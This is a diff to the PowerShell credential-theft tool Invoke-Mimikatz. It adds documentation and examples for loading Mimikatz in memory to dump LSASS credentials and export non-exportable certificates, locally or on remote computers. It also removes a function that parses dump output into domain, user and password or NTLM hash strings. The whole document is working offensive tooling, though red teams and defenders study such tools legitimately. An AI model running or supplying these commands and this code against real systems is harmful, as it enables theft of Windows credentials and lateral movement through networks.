@@ -2,7 +2,65 @@ function Invoke-Mimikatz
 {
 <#
 .SYNOPSIS
-Authors: Joe Bialek & Benjamin DELPY
+
+This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
+dump credentials without ever writing the mimikatz binary to disk. 
+The script has a ComputerName parameter which allows it to be executed against multiple computers.
+
+This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
+
+Function: Invoke-Mimikatz
+Author: Joe Bialek, Twitter: @JosephBialek
+Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
+License:  http://creativecommons.org/licenses/by/3.0/fr/
+Required Dependencies: Mimikatz (included)
+Optional Dependencies: None
+Mimikatz version: 2.0 alpha (12/14/2015)
+
+.DESCRIPTION
+
+Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
+functionality provided with Mimikatz.
+
+.PARAMETER DumpCreds
+
+Switch: Use mimikatz to dump credentials out of LSASS.
+
+.PARAMETER DumpCerts
+
+Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
+
+.PARAMETER Command
+
+Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
+
+.PARAMETER ComputerName
+
+Optional, an array of computernames to run the script on.
+	
+.EXAMPLE
+
+Execute mimikatz on the local computer to dump certificates.
+Invoke-Mimikatz -DumpCerts
+
+.EXAMPLE
+
+Execute mimikatz on two remote computers to dump credentials.
+Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+
+.EXAMPLE
+
+Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
+Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+
+.NOTES
+This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
+Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
+Find mimikatz at: http://blog.gentilkiwi.com
+
+.LINK
+
+http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 #>
 
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
@@ -2674,106 +2732,4 @@ Function Main
 }
 
 Main
-}
-
-function Parse-Mimikatz {
-param(  
-    [Parameter(
-        Position=0, 
-        Mandatory=$true, 
-        ValueFromPipeline=$true,
-        ValueFromPipelineByPropertyName=$true)
-    ]
-    [String[]]$raw
-    ) 
-
-    # msv
-	$results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
-    if($results){
-        foreach($match in $results){
-            if($match.Contains("Domain")){
-                $lines = $match.split("`n")
-                foreach($line in $lines){
-                    if ($line.Contains("Username")){
-                        $username = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Domain")){
-                        $domain = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("NTLM")){
-                        $password = $line.split(":")[1].trim()
-                    }
-                }
-                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
-                    $domain+"\"+$username+":"+$password
-                }
-            }
-        }
-    }
-    $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
-    if($results){
-        foreach($match in $results){
-            if($match.Contains("Domain")){
-                $lines = $match.split("`n")
-                foreach($line in $lines){
-                    if ($line.Contains("Username")){
-                        $username = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Domain")){
-                        $domain = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Password")){
-                        $password = $line.split(":")[1].trim()
-                    }
-                }
-                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
-                    $domain+"\"+$username+":"+$password
-                }
-            }
-        }
-    }
-    $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
-    if($results){
-        foreach($match in $results){
-            if($match.Contains("Domain")){
-                $lines = $match.split("`n")
-                foreach($line in $lines){
-                    if ($line.Contains("Username")){
-                        $username = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Domain")){
-                        $domain = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Password")){
-                        $password = $line.split(":")[1].trim()
-                    }
-                }
-                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
-                    $domain+"\"+$username+":"+$password
-                }
-            }
-        }
-    }
-    $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
-    if($results){
-        foreach($match in $results){
-            if($match.Contains("Domain")){
-                $lines = $match.split("`n")
-                foreach($line in $lines){
-                    if ($line.Contains("Username")){
-                        $username = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Domain")){
-                        $domain = $line.split(":")[1].trim()
-                    }
-                    elseif ($line.Contains("Password")){
-                        $password = $line.split(":")[1].trim()
-                    }
-                }
-                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
-                    $domain+"\"+$username+":"+$password
-                }
-            }
-        }
-    }
 }
